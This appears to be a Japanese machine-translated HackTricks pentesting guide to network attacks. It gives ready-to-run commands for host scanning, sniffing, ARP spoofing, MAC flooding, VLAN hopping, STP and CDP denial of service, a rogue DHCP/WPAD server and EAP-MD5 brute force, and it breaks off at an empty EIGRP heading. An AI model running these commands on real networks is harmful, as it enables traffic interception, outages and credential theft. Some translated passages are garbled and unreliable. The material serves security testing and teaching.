# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## 外部からホストを発見する

これは**インターネット**上で**応答しているIP**を見つける方法についての**短いセクション**です。\
この状況では、ある**IPの範囲**（場合によっては複数の**レンジ**）がスコープにあり、どのIPが**応答しているか**を特定したいだけです。

### ICMP

これはホストが起動しているかどうかを確認するための**最も簡単**で**最速**の方法です。\
いくつかの**ICMP**パケットを送り、**応答を期待**します。最も簡単なのは**echo request**を送って応答を待つことです。単純な`ping`で行うか、`fping`を使って**範囲**に対して実行できます。\
また、`nmap`を使って他の種類のICMPパケットを送ることもできます（これは一般的なICMP echo request-responseへのフィルタを回避します）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

あらゆる種類の ICMP パケットがフィルタリングされていることは非常に一般的です。\
そのため、ホストが up かどうかを確認するためにできることは**try to find open ports**だけです。各ホストには**65535 ports**あるので、スコープが大きい場合、各ホストの**each port**が開いているかどうかをすべてテストすることは**cannot**で、非常に時間がかかります。\
そこで必要なのは**fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan))と、**ports more used:**のリストです。
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
`nmap`でもこのステップを実行できますが、遅く、また `nmap` はホストが up であることを識別するのに問題があります。

### HTTP ポート探索

これは、HTTPサービスの発見に**集中したい**ときに有用なTCPポート探索です:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

特定の **UDP port open** を確認して、ある **host.** に **pay more attention** すべきか判断することもできます。UDP services は通常、空の UDP probe packet に対して **don't respond** で **any data** を返さないため、ポートが filtered or open かどうかを判定するのは難しいです。これを判断する最も簡単な方法は、running service に関連する packet を送ることです。どの service が running しているか分からない場合は、port number に基づいて最も可能性の高いものを試してください:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
前述の nmap ラインは、各ホストの **top 1000 UDP ports** を **/24** レンジ内でテストしますが、これだけでも **>20min** かかります。もし **fastest results** が必要なら、[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) を使うことができます: `./udp-proto-scanner.pl 199.66.11.53/24`。  
これはこれらの **UDP probes** をそれぞれの **expected port** に送信します（/24 range ではこれは約 1 分で完了します）: _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

ここでは、執筆時点で知られているすべての有名なWifi攻撃に関する良いガイドが見つかります：

{{#ref}}
../pentesting-wifi/
{{#endref}}

## 内部からのホスト発見

ネットワーク内にいる場合、最初に行いたいことの一つは**他のホストを発見すること**です。どれだけの**ノイズ**を出せる／出したいかに応じて、さまざまな行動が考えられます：

### Passive

接続されたネットワーク内のホストをパッシブに発見するために、これらのツールを使用できます：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### アクティブ

この[_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside)（_TCP/HTTP/UDP/SCTP Port Discovery_）で説明した手法はここでも**適用できます**。\
しかし、他のホストと**同じネットワーク**にいるため、**さらに多くのこと**ができます：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### アクティブな ICMP

外部からのホスト発見（_外部からのホスト発見_ ([_**ICMP**_](#icmp))）で述べた手法はここでも**適用できます**。\
しかし、他のホストと**同じネットワーク**にいるため、**さらに多くのこと**ができます:

- サブネットのブロードキャストアドレスに**ping**を送ると、そのpingは**各ホスト**に届き、彼らは**あなたに****応答**する可能性があります: `ping -b 10.10.5.255`
- ネットワークブロードキャストアドレスにpingを送ると、**他のサブネット**内のホストも見つかる可能性があります: `ping -b 255.255.255.255`
- `nmap`の`-PE`, `-PP`, `-PM`フラグを使用して、それぞれ**ICMPv4 echo**、**timestamp**、および**subnet mask requests**を送ることでホスト探索を実行できます: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lanは、**network message**を介してコンピュータを**起動**するために使われます。コンピュータを起動するために使用されるmagic packetは、**MAC Dst**が指定され、そのMACが同一パケット内で**16回繰り返されている**だけのパケットです。\
この種のパケットは通常**ethernet 0x0842**か、**UDP**のポート9へのパケットで送られます。\
もし**no [MAC]**が指定されない場合、パケットは**broadcast ethernet**に送られ（ブロードキャストMACが繰り返されます）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## ホストのスキャン

深くスキャンしたいすべてのIP（外部または内部）を特定したら、さまざまなアクションを実行できます。

### TCP

- **開いている** port: _SYN --> SYN/ACK --> RST_
- **閉じている** port: _SYN --> RST/ACK_
- **フィルタリングされた** port: _SYN --> [応答なし]_
- **フィルタリングされた** port: _SYN --> ICMP メッセージ_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

There are 2 options to scan an UDP port:

- **UDP packet** を送信し、ポートが **closed** の場合に応答として _**ICMP unreachable**_ が返るかを確認します（多くの場合 ICMP は **filtered** されるため、ポートが closed か open かの情報を受け取れないことがあります）。
- **formatted datagrams** を送って **service** からの応答を引き出します（例: DNS, DHCP, TFTP など、_nmap-payloads_ に一覧があります）。**response** を受け取った場合、ポートは **open** です。

**Nmap** は "-sV" を使ってオプションを **mix both** します（UDP スキャンは非常に遅い）が、UDP スキャンは TCP スキャンより遅いことに注意してください:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP スキャン

**SCTP (Stream Control Transmission Protocol)** は **TCP (Transmission Control Protocol)** および **UDP (User Datagram Protocol)** と共に使用されるよう設計されています。主な目的は IP ネットワーク上での電話データの伝送を容易にすることで、**Signaling System 7 (SS7)** に見られる多くの信頼性機能を反映しています。**SCTP** は、SS7 信号を IP ネットワーク上で運ぶことを目的とする **SIGTRAN** プロトコルファミリーの中核コンポーネントです。

**SCTP** のサポートは **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, および **VxWorks** といったさまざまなオペレーティングシステムで提供されており、通信およびネットワーク分野での広い受容性と有用性を示しています。

SCTP 向けのスキャンは nmap で 2 種類提供されています: _-sY_ と _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS と IPS の回避


{{#ref}}
ids-evasion.md
{{#endref}}

### **nmap のその他のオプション**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### 内部IPアドレスの露出

**設定ミスのある routers、firewalls、network devices は、ネットワークプローブに対して nonpublic source addresses を使って応答することがあります。** **tcpdump** は、テスト中に private addresses から受信したパケットを識別するために使用できます。具体的には、Kali Linux 上では、パブリックインターネットからアクセス可能な **eth2 interface** でパケットをキャプチャできます。重要なのは、環境が NAT または Firewall の背後にある場合、こうしたパケットはフィルタされる可能性が高いという点です。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing により、キャプチャしたフレームやパケットを解析して IP 範囲、サブネットサイズ、MAC アドレス、ホスト名などの詳細を把握できます。ネットワークが誤設定されているか、スイッチングファブリックに負荷がかかっている場合、攻撃者は passive network sniffing を使って機密情報を取得することがあります。

スイッチド Ethernet ネットワークが適切に設定されている場合、見ることができるのはブロードキャストフレームと自分の MAC アドレス宛のトラフィックのみです。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
リモートマシンからSSHセッション経由で、WiresharkをGUIとして使用しリアルタイムにパケットをキャプチャすることもできる。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

もちろん。

### 認証情報の取得

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) のようなツールを使って、pcap や live interface から認証情報を解析できます。

## LAN攻撃

### ARP spoofing

ARP Spoofing は gratuitous ARPResponses を送信して、あるマシンの IP が我々のデバイスの MAC であることを示す攻撃です。すると、victim は ARP table を変更し、その IP spoofed に接続しようとするたびに我々のマシンに接続します。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

多数の異なる source mac address を持つ packets を大量に送信して switch の CAM table をオーバーフローさせる。CAM table が満杯になると、switch は hub のように振る舞い、すべてのトラフィックを broadcasting するようになる。
```bash
macof -i <interface>
```
最新のスイッチではこの脆弱性は修正されています。

### 802.1Q VLAN / DTP 攻撃

#### Dynamic Trunking

**Dynamic Trunking Protocol (DTP)** はリンク層プロトコルとして設計され、トランキングを自動化し、スイッチがポートを自動的に Trunk モードまたは非 Trunk モードに選択できるようにします。DTP の展開はしばしば最適でないネットワーク設計の兆候と見なされ、必要な箇所でのみ Trunk を手動で設定し、適切にドキュメント化することの重要性を強調します。

デフォルトでは、スイッチポートは Dynamic Auto モードに設定されており、隣接するスイッチからの要求があればトランキングを開始する準備ができています。pentester や攻撃者がスイッチに接続して DTP Desirable フレームを送信し、ポートを Trunk モードにさせるとセキュリティ上の問題が発生します。これにより攻撃者は STP フレームの解析を通じて VLAN を列挙し、仮想インターフェースを設定して VLAN の分割を回避できます。

多くのスイッチで DTP がデフォルトで有効になっていると、攻撃者はスイッチの挙動を模倣して全ての VLAN のトラフィックにアクセスできるようになります。スクリプト [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) を使うとインターフェースを監視し、スイッチが Default、Trunk、Dynamic、Auto、または Access モードのどれかを示します。後者（Access）は VLAN hopping attacks に対して唯一免疫のある構成です。このツールでスイッチの脆弱性状況を評価できます。

ネットワークの脆弱性が確認された場合、_**Yersinia**_ ツールを使って DTP プロトコル経由で "enable trunking" を実行し、全 VLAN のパケットを観察できます。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLANs を列挙するには、スクリプト [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. D**o スクリプトをいかなる状況でも中断しないでください。 それは3秒ごとに DTP Desirable を注入します。 **スイッチ上で動的に作成された trunk チャネルは5分間しか持続しません。5分後に trunk は切断されます。**
```
sudo python3 DTPHijacking.py --interface eth0
```
I would like to point out that **Access/Desirable (0x03)** indicates that the DTP frame is of the Desirable type, which tells the port to switch to Trunk mode. And **802.1Q/802.1Q (0xa5** indicates the **802.1Q** encapsulation type.

STPフレームを解析することで、**VLAN 30 と VLAN 60 の存在が分かります。**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### 特定のVLANを攻撃する

VLAN ID と IP 値を把握したら、**特定のVLANを攻撃するために仮想インターフェースを設定できます**。\
DHCP が利用できない場合は、_ifconfig_ を使って静的IPアドレスを設定してください。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

前述の攻撃である **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** による他の VLAN 内のホスト検出はツールによって **自動的に実行されます**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

攻撃者が被害ホストの **MAC, IP and VLAN ID of the victim host** を把握している場合、被害者の VLAN と攻撃者の VLAN を付与してフレームを **double tag a frame** し、パケットを送信することができます。被害者は攻撃者へ接続し返すことができないため、攻撃者にとっては **best option for the attacker is communicate via UDP**（SNMP のような興味深い動作を行えるプロトコル）を使うのが最適です。

別の選択肢として、攻撃者は **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim**（おそらくインターネット経由）を実行することができます。そうすれば、攻撃者が所有する別のホストで被害者からのパケットを受信するかどうかを sniff できます。

![](<../../images/image (190).png>)

この攻撃を実行するには scapy を使用できます: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### ラテラル VLAN セグメンテーションの回避 <a href="#d679" id="d679"></a>

もしあなたが直接接続している switch に **アクセスできる**なら、ネットワーク内の **VLAN セグメンテーションを回避**することが可能です。単純にポートを **trunk mode（trunk）** に切り替え、ターゲット VLAN の ID で virtual interfaces を作成し、IP アドレスを設定します。アドレスは動的に取得（DHCP）するか、静的に設定するかはケースによります。


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### レイヤ 3 の Private VLAN バイパス

ゲスト無線ネットワークなどの特定の環境では、**port isolation (also known as private VLAN)** 設定が無線 access point に接続したクライアント同士の直接通信を防ぐために実装されています。しかし、これらの分離を回避できる技術が確認されています。この技術は、network ACLs の欠如や設定不備を突くことで、IP packets を router 経由で同一ネットワーク上の別のクライアントに到達させることを可能にします。

攻撃は、**宛先クライアントの IP アドレスを含むが router の MAC address を持つパケット**を作成することで実行されます。これにより router は誤ってパケットをターゲットクライアントに転送してしまいます。この手法は Double Tagging Attacks で使われるものと類似しており、victim が到達可能な host を制御できることを利用してセキュリティ上の欠陥を突きます。

**攻撃の主な手順:**

1. **パケットの作成:** ターゲットクライアントの IP アドレスを含みつつ router の MAC address を持つように特別に作成されたパケットを用意します。
2. **router の挙動を利用:** 作成したパケットを router に送ると、設定によっては router がそのパケットをターゲットクライアントにリダイレクトし、private VLAN による分離を回避します。

### VTP Attacks

VTP (VLAN Trunking Protocol) は VLAN の管理を集中化します。VLAN データベースの整合性を維持するために revision numbers を使い、変更があるたびにこの番号がインクリメントされます。switch はより高い revision number を持つ構成を採用し、自身の VLAN データベースを更新します。

#### VTP Domain Roles

- **VTP Server:** VLAN を管理し、作成・削除・変更を行います。ドメインメンバーに対して VTP アナウンスをブロードキャストします。
- **VTP Client:** VTP アナウンスを受け取り VLAN データベースを同期します。ローカルでの VLAN 設定変更は制限されます。
- **VTP Transparent:** VTP の更新には関与せず、VTP アナウンスを中継します。VTP 攻撃の影響を受けず、revision number は常にゼロのままです。

#### VTP Advertisement Types

- **Summary Advertisement:** VTP Server が 300 秒ごとにブロードキャストする、ドメインの基本情報を運ぶアナウンス。
- **Subset Advertisement:** VLAN 設定変更の後に送信されるアナウンス。
- **Advertisement Request:** VTP Client が Summary Advertisement を要求するために発行するもので、通常はより高い configuration revision number を検出した際に行われます。

VTP の脆弱性は trunk ports を介してのみ悪用可能であり、VTP アナウンスは trunk を通してのみ流れます。DTP 攻撃のあとに VTP を狙うシナリオも考えられます。Yersinia のようなツールを使って VTP を攻撃し、VLAN データベースを消去してネットワークを破壊することが可能です。

Note: This discussion pertains to VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
Yersiniaのグラフィカルモードでは、VLANデータベースを消去するために、deleting all VTP vlans オプションを選択してください。

### STP 攻撃

**もしインターフェースでBPDUフレームをキャプチャできない場合、STP攻撃が成功する可能性は低いです。**

#### **STP BPDU DoS**

大量のBPDUs、TCP (Topology Change Notification) または Conf (the BPDUs that are sent when the topology is created) を送信すると、スイッチが過負荷になり正常に動作しなくなります。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

TCPが送信されると、スイッチのCAM tableは15秒で消去されます。もしこの種のパケットを継続的に送信すると、CAM tableは継続的に（または15秒ごとに）再作成され、その再作成時にスイッチはハブのように振る舞います。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

攻撃者は switch の振る舞いをシミュレートしてネットワークの STP root になろうとします。すると、より多くのデータが攻撃者を経由するようになります。これは、2つの異なる switches に接続しているときに有用です。\
これは、実際の root switch の **priority** 値よりも小さいとする BPDUs CONF パケットを送信することで行われます。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**もし attacker が2台の switches に接続されている場合、彼は新しいツリーの root になり、両 switches 間のすべてのトラフィックが彼を経由します**（MITM attack が実行されます）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 攻撃

CISCO Discovery Protocol (CDP) は CISCO デバイス同士の通信に不可欠で、互いに**識別し、設定情報を共有する**ことを可能にします。

#### 受動的データ収集 <a href="#id-0e0f" id="id-0e0f"></a>

CDP はすべてのポートを通じて情報をブロードキャストするように設定されており、これがセキュリティリスクにつながる可能性があります。攻撃者がスイッチポートに接続すると、**Wireshark**, **tcpdump**, **Yersinia** のようなネットワークスニッファを展開して、ネットワーク機器のモデルや稼働している Cisco IOS のバージョンなどの機密情報を明らかにすることができます。攻撃者は特定された Cisco IOS バージョンの脆弱性を狙う可能性があります。

#### CDP テーブルのフラッディング誘発 <a href="#id-0d6a" id="id-0d6a"></a>

より攻撃的な手法は、正当な CISCO デバイスになりすましてスイッチのメモリを圧倒し、Denial of Service (DoS) 攻撃を開始することです。以下は、テスト用ネットワークツールである Yersinia を使用してそのような攻撃を開始するためのコマンド列です:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
この攻撃では、switch's CPU と CDP neighbor table に大きな負荷がかかり、過剰なリソース消費によりしばしば **「ネットワーク麻痺」** と呼ばれる状態を引き起こします。

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP攻撃とVoIP Hopperツール

VoIP電話は、IoTデバイスとますます統合されており、特定の電話番号を通じてドアの解錠やサーモスタットの制御などの機能を提供します。しかし、この統合はセキュリティ上のリスクを引き起こす可能性があります。

ツール [**voiphopper**](http://voiphopper.sourceforge.net) は、さまざまな環境（Cisco、Avaya、Nortel、Alcatel-Lucent）でVoIP電話をエミュレートするよう設計されています。CDP、DHCP、LLDP-MED、802.1Q ARPなどのプロトコルを使用して、音声ネットワークのVLAN IDを検出します。

**VoIP Hopper** はCisco Discovery Protocol (CDP) に対して3つのモードを提供します:

1. **Sniff Mode** (`-c 0`): ネットワークパケットを解析してVLAN IDを特定します。
2. **Spoof Mode** (`-c 1`): 実際のVoIPデバイスのパケットを模倣したカスタムパケットを生成します。
3. **Spoof with Pre-made Packet Mode** (`-c 2`): 特定のCisco IP電話モデルと同一のパケットを送信します。

速度を重視する場合、3番目のモードが推奨されます。これには次の指定が必要です：

- 攻撃者のネットワークインターフェース（`-i`パラメータ）。
- エミュレートするVoIPデバイスの名前（`-E`パラメータ）。Ciscoの命名フォーマットに従う必要があります（例：SEPにMACアドレスを続けた形式）。

企業環境では、既存のVoIPデバイスを模倣するには、次のような方法があります：

- 電話のMACラベルを確認する。
- 電話のディスプレイ設定を確認してモデル情報を見る。
- VoIPデバイスをラップトップに接続し、WiresharkでCDPリクエストを観察する。

3番目のモードでツールを実行するための例コマンドは次のとおりです：
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS** は DHCP servers に対して実行できます。  
The first one consists on **すべての可能な IP アドレスを使い切るのに十分な偽ホストをシミュレートする**.\

この攻撃は DHCP server の応答を監視してプロトコル（**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)）を完了できる場合にのみ有効です。例えば、これは **Wifi networks では不可能です**。

Another way to perform a DHCP DoS is to send a **DHCP-RELEASE パケットを送信元にあらゆる可能な IP を使って送信する**。Then, the server will think that everybody has finished using the IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
より自動化された方法として、ツール [DHCPing](https://github.com/kamorin/DHCPig) を使用できます。

前述の DoS 攻撃を使って、環境内のクライアントに新しいリースを取得させたり、正規のサーバーを枯渇させて応答不能にすることができます。したがって、正規のクライアントが再接続を試みるとき、**次の攻撃で述べる悪意のある値を提供できます**。

#### 悪意のある値を設定

不正な DHCP サーバーは、`/usr/share/responder/DHCP.py` にある DHCP スクリプトを使って構築できます。これは、トラフィックを悪意のあるサーバーにリダイレクトして HTTP トラフィックや認証情報をキャプチャするなどのネットワーク攻撃に有用です。ただし、不正なゲートウェイを設定するのは効果が薄く、クライアントからの発信トラフィックしかキャプチャできず、実際のゲートウェイからの応答を見逃すことになります。より効果的な攻撃には、不正な DNS や WPAD サーバーの設定を推奨します。

以下は不正な DHCP サーバーを設定するためのコマンドオプションです:

- **自分のIPアドレス（ゲートウェイとして広告）**: `-i 10.0.0.100` を使用して、マシンの IP をゲートウェイとして広告します。
- **ローカル DNS ドメイン名**: 必要に応じて `-d example.org` を使用してローカル DNS ドメイン名を設定します。
- **元のルーター/ゲートウェイの IP**: `-r 10.0.0.1` を使用して、正規のルーターまたはゲートウェイの IP アドレスを指定します。
- **プライマリ DNS サーバーの IP**: `-p 10.0.0.100` を使用して、制御する不正な DNS サーバーの IP アドレスを設定します。
- **セカンダリ DNS サーバーの IP**: 必要に応じて `-s 10.0.0.1` を使用してセカンダリ DNS サーバーの IP を設定します。
- **ローカルネットワークのネットマスク**: `-n 255.255.255.0` を使用してローカルネットワークのネットマスクを定義します。
- **DHCP トラフィックを監視するインターフェース**: `-I eth1` を使用して特定のネットワークインターフェースで DHCP トラフィックをリッスンします。
- **WPAD 設定アドレス**: `-w “http://10.0.0.100/wpad.dat”` を使用して WPAD 設定のアドレスを設定し、Web トラフィックの傍受を支援します。
- **デフォルトゲートウェイの IP を偽装**: `-S` を含めてデフォルトゲートウェイの IP を偽装します。
- **すべての DHCP リクエストに応答**: `-R` を含めてサーバーがすべての DHCP リクエストに応答するようにしますが、これはノイズが大きく検出されやすい点に注意してください。

これらのオプションを正しく使用することで、不正な DHCP サーバーを構築してネットワークトラフィックを効果的に傍受できます。
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP 攻撃**

ここでは 802.1X 実装に対して使われる攻撃手法のいくつかを示します:

- EAP を介した Active brute-force password grinding
- malformed EAP content を使った RADIUS server への攻撃 _\*\*_(exploits)
- EAP メッセージの capture と offline password cracking (EAP-MD5 と PEAP)
- TLS certificate validation を bypass するために EAP-MD5 認証へ強制する
- hub 等を使用して認証時に malicious network traffic を注入する

攻撃者が被害者と認証サーバの間にいる場合、認証プロトコルを（必要に応じて）EAP-MD5 にダウングレードさせて認証試行を capture することができます。次に、これを brute-force することができます:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) 攻撃 <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) は、ホット冗長ルーティングシステムを構築するために設計されたネットワークプロトコルのクラスです。FHRP を使うと、物理的なルータを単一の論理デバイスとしてまとめられ、フォルトトレランスが向上し、負荷分散が可能になります。

**Cisco Systems のエンジニアは、GLBP と HSRP の二つの FHRP プロトコルを開発しました。**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

RIP、RIPv2、RIPng の3つのバージョンが存在します。RIP と RIPv2 は UDP のポート 520 を使ってピアにデータグラムを送信し、RIPng は IPv6 マルチキャストで UDP ポート 521 にデータグラムをブロードキャストします。RIPv2 は MD5 認証をサポートしています。一方、RIPng はネイティブな認証を含まず、代わりに IPv6 内でのオプションの IPsec AH と ESP ヘッダに依存します。

- **RIP and RIPv2:** Communication is done through UDP datagrams on port 520.
- **RIPng:** Utilizes UDP port 521 for broadcasting datagrams via IPv6 multicast.

RIPv2 が MD5 認証をサポートしている点に注意してください。RIPng はネイティブな認証を含まず、IPv6 の IPsec AH と ESP ヘッダに依存します。

### EIGRP 攻撃

